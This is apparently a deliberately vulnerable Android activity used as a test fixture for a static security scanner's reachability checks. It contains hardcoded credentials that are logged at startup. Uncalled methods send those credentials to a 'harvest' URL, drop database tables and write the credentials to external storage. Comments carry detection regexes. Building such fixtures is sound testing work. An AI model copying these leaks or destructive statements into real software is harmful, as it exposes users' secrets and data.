package com.test.reachability;

import android.content.Intent;
import android.database.sqlite.SQLiteDatabase;
import android.os.Bundle;
import android.os.Environment;
import android.util.Log;
import android.widget.Button;
import android.widget.LinearLayout;

import androidx.appcompat.app.AppCompatActivity;

import java.io.FileWriter;
import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.URL;

public class MainActivity extends AppCompatActivity {

    // VULNERABILITY: Hardcoded sensitive information (credentials in source code)
    // MobSF Rule: android_hardcoded
    // Pattern: (password\s*=\s*['|"].{1,100}['|"]) | (key\s*=\s*['|"].{1,100}['|"])
    // input_case: lower | type: Regex
    // CWE: CWE-312 | OWASP Mobile: M9 | MASVS: storage-14
    public static final String API_KEY = "sk-prod-ABC123hardcodedSecret999";
    public static final String DB_PASSWORD = "admin1234!";

    private static final String TAG = "MainActivity";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setPadding(32, 32, 32, 32);

        Button btnNetwork = new Button(this);
        btnNetwork.setText("Network Demo");
        btnNetwork.setOnClickListener(v -> startActivity(new Intent(this, NetworkActivity.class)));
        layout.addView(btnNetwork);

        Button btnStorage = new Button(this);
        btnStorage.setText("Storage Demo");
        btnStorage.setOnClickListener(v -> startActivity(new Intent(this, StorageActivity.class)));
        layout.addView(btnStorage);

        Button btnComponent = new Button(this);
        btnComponent.setText("Component Demo");
        btnComponent.setOnClickListener(v -> startActivity(new Intent(this, ExposedActivity.class)));
        layout.addView(btnComponent);

        Button btnSql = new Button(this);
        btnSql.setText("SQL Demo");
        btnSql.setOnClickListener(v -> startActivity(new Intent(this, SqlActivity.class)));
        layout.addView(btnSql);

        setContentView(layout);

        logCredentials();
    }

    // VULNERABILITY: Sensitive data leakage via Android logging
    // MobSF Rule: android_logging
    // Pattern: Log\.(v|d|i|w|e|f|s)|System\.out\.print|System\.err\.print
    // input_case: exact | type: Regex
    // CWE: CWE-532 | OWASP Mobile: (info) | MASVS: storage-3
    private void logCredentials() {
        Log.d(TAG, "App initialized with key: " + API_KEY);
        Log.d(TAG, "DB access with: " + DB_PASSWORD);
    }

    // DEAD CODE - reachability test: should NOT be flagged
    // Simulated MobSF Rule: android_hardcoded (key=... / pass=... pattern)
    // Pattern: (key\s*=\s*['|"].{1,100}['|"]) | (pass\s*=\s*['|"].{1,100}['|"])
    // input_case: lower | type: Regex
    // CWE: CWE-312 | OWASP Mobile: M9 | MASVS: storage-14
    // Also matches: android_ip_disclosure (IP address in URL)
    private void leakCredentialsToUrl() {
        try {
            String leakUrl = "http://10.0.2.2/harvest?key=" + API_KEY + "&pass=" + DB_PASSWORD;
            URL url = new URL(leakUrl);
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("GET");
            connection.connect();
            connection.disconnect();
        } catch (IOException e) {
            Log.e(TAG, "Leak failed", e);
        }
    }

    // DEAD CODE - reachability test: should NOT be flagged
    // Simulated MobSF Rule: android_sql_raw_query
    // Pattern: android\.database\.sqlite AND (rawQuery\( | execSQL\()
    // input_case: exact | type: RegexAndOr
    // CWE: CWE-89 | OWASP Mobile: M7 | MASVS: (none)
    private void nukeDatabase() {
        UserDatabaseHelper helper = new UserDatabaseHelper(this);
        SQLiteDatabase db = helper.getWritableDatabase();
        db.execSQL("DROP TABLE IF EXISTS users");
        db.execSQL("DROP TABLE IF EXISTS sessions");
        db.close();
    }

    // DEAD CODE - reachability test: should NOT be flagged
    // Simulated MobSF Rule: android_read_write_external
    // Pattern: \.getExternalStorage | \.getExternalFilesDir\(
    // input_case: exact | type: RegexOr
    // CWE: CWE-276 | OWASP Mobile: M2 | MASVS: storage-2
    @SuppressWarnings("deprecation")
    private void writeCredsToExternalStorage() {
        try {
            java.io.File file = new java.io.File(Environment.getExternalStorageDirectory(), "leaked_creds.txt");
            FileWriter writer = new FileWriter(file);
            writer.write(API_KEY + "\n" + DB_PASSWORD);
            writer.close();
        } catch (IOException e) {
            Log.e(TAG, "Write failed", e);
        }
    }
}
